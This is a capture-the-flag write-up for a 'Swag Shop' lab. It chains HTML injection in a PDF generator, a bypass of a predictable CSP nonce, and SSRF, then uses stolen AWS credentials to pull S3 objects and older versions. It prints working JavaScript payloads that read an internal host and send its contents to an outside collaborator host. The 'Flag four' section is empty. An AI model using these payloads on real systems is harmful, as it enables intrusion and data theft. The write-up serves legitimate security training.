# Hubs - Swag Shop Writeup
As most labs created by Adam we start with enumeration to identify potential subdomains that might be part of this challenge.

## Enumeration
After bruteforcing vhosts (either via ffuf or burp) we obtaint he following list.

**UUID.ctfio.com**

This is the main application where users can claim and place orders for swag. The UUID is unique for each deployed instance.

**env.UUID.ctfio.com**

This host seems not publicly accessible as it displays the message below.

*"error":"Access from this IP address is forbidden!"*

![image](https://github.com/tarifas90/CTF-Writeups-2023/assets/55701068/feed5f13-5783-4836-94e9-61579f82ae34)

When encountering such error messages it is expected to find another vulnerability such as SSRF that will allow access to the page's content. Therefore we should keep this in mind.

**shipping.UUID.ctfio.com**

The application hosted here appears to be the place where the orders placed by users can be managed. We can not login with weak/easy to guess credentials and we are able to identify a /register endpoint.
However the following message is displayed.

*Registration is not enabled on this server*

![image](https://github.com/tarifas90/CTF-Writeups-2023/assets/55701068/725dfb26-426e-4c1a-b006-e616bc6ba0b4)

**NOTE:** It is always valuable to fuzz furhter down for vhosts/subdomains such as XXX.discovered-subdomain.UUID.ctfio.com

**dev.shipping.UUID.ctfio.com**

We identify a different subdomain for shipping, however in this case we see a message mentioning that the server is not enabled. We take another note that there shoudl be a functionality that should allow us to enbale this application.

![image](https://github.com/tarifas90/CTF-Writeups-2023/assets/55701068/fcb82348-25d5-480f-9798-fda94d37e7fc)

Performing further enumeration such as fuzzing for endpoints and parameters on the identified subdomains does not wield any valueable results. 

## Flag one

Attempting to test the main application, when creating an order, the application allows users to also generate the PDF of the created order.
Checking the generated PDF, we identify that it is created via Skia/PDF m115. Normally such functionalities indicate that if we are able to inject some HTML code within the generated PDF we might be able to take advantage of the headless browser used for its creation and achieve SSRF attacks etc.

Using the above hypothesis eventually we are able to achieve HTML injection within the generated PDFs with a code like the following being placed in the address field

`</textarea><h1>HTML Injected</h1>`

The submited request is the following

![image](https://github.com/tarifas90/CTF-Writeups-2023/assets/55701068/eed42e0d-ec0c-495a-96f9-0ba1eb308c9d)

Once the PDF is generated we can see that we have successfully achieved HTML injection, as our payload is rendered within the PDF document.

![image](https://github.com/tarifas90/CTF-Writeups-2023/assets/55701068/74ea672c-017e-4176-93ba-e9fb63504b09)

Our next goal now would be to perform an attack that would allow us to see if we can access the content of the `env` host.

However, observing the response headers from the previous screenshost we can notice that the web application implements a CSP policy.

```http
Content-Security-Policy: img-src 'self';script-src 'nonce-1692256624' 'self' ajax.googleapis.com maxcdn.bootstrapcdn.com;frame-src 'none';script-src-attr 'none'
```

Therefore this limits our options for SSRF as we can't use stuff such as iframes. By reviewing the CSP policy we notice that for **script-src** a nonce is used. The nonce however appears to be sort and weak, as it is a predictable value. 
In more detail the nonce appears to be the epoch time. This means that it can be predictable and therefore easy to submit a value that will allow script execution.

Therefore, we now have a target and a potential bypass on the implemented protections. Subsequently we can craft an attack payload to confirm if the bot can access the **env** subdomain and read its contents.

The following code can be used.

```javacript
<script nonce='1692123412'>
var url = "http://env.UUID.ctfio.com";
var attacker = "http://COLLAB_ID.oastify.com/exfil";
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open('GET', url, true);
xhr.send(null);
</script>
```

The code above will attempt to read the contents of the **env** domain including a nonce for the script that should be equal to the epoch time the server has during its execution. Once the content is read it will be send to our collaborator server.

To ensure that the nonce value will be correct, we can include additional nonces each one incremented by one. Example below

```javascript
</textarea>
<script nonce='1692123412'>
var url = "http://env.UUID.ctfio.com";
var attacker = "http://COLLAB_ID.oastify.com/exfil";
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open('GET', url, true);
xhr.send(null);
</script>
<script nonce='1692123413'>

....


<script nonce='1692123417'>
var url = "http://env.UUID.ctfio.com";
var attacker = "http://COLLAB_ID.oastify.com/exfil";
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open('GET', url, true);
xhr.send(null);
</script>
```
Once the PDF is generated we’ll receive a request in Burp collaborator and the contents of the **env.UUID.ctfio.com** website are returned base64 encoded. The first flag will be within the content of that page.

![1](https://github.com/tarifas90/CTF-Writeups-2023/assets/55701068/8646cf9b-093b-405b-ba42-803c7e6246ee)

## Flag two

Apparently now we have obtained a set of AWS credentials and a bucket name.

We can use the aws cli to connect to the bucket with the credentials and see what is hosted there. We can run the following commands

```console
aws configure //Set the credentials obtained above
aws s3 ls s3://ctfswagshop
aws s3 cp s3://ctfswagshop/flag.txt .
```

![image](https://github.com/tarifas90/CTF-Writeups-2023/assets/55701068/38757fbb-0268-4ca2-9a61-1dbc37dd4d1e)

We therefore obtain the second flag.

## Flag three

After obtaining the flag above, there was not much to look into as the keys.txt file was empty.
Checking for past versions of the S3 bucket via the command below will give an indication that the keys.txt file used to server some content.

```console
aws s3api list-object-versions --bucket ctfswagshop
```

![image](https://github.com/tarifas90/CTF-Writeups-2023/assets/55701068/962e6e5f-122e-44e9-95bc-9322a8e764d0)

We can then try to obtain the keys file via the following commands and eventually we will get the third flag

```console
aws s3api get-object --bucket ctfswagshop --version-id nt_d96XI4vefGPrnjRM_JcICfjm.V1zb --key keys.txt keys.txt
```

![2](https://github.com/tarifas90/CTF-Writeups-2023/assets/55701068/2c7af509-d890-4a04-926c-a7b1e87b90fe)

## Flag four




